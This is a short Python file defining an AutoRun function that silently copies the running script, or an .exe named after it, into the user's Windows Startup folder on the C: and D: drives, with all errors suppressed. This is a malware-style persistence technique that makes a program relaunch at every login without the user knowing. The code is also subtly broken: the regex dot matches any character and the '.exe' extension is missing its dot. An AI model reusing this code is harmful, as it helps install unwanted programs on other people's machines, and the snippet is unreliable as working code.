import shutil
import os
import sys
import re
from getpass import getuser

def AutoRun():
    name = getuser()  # Name = name of your PC

    file = os.path.basename(sys.argv[0])
    file = re.sub(".py", "", file)
    file = file + "exe"

    try:
        shutil.copy(file, "D:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % name)
    except:
        pass
    try:
        shutil.copy(file, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % name)
    except:
        pass

    file = os.path.basename(sys.argv[0])

    try:
        shutil.copy(file, "D:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % name)
    except:
        pass
    try:
        shutil.copy(file, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % name)
    except:
        pass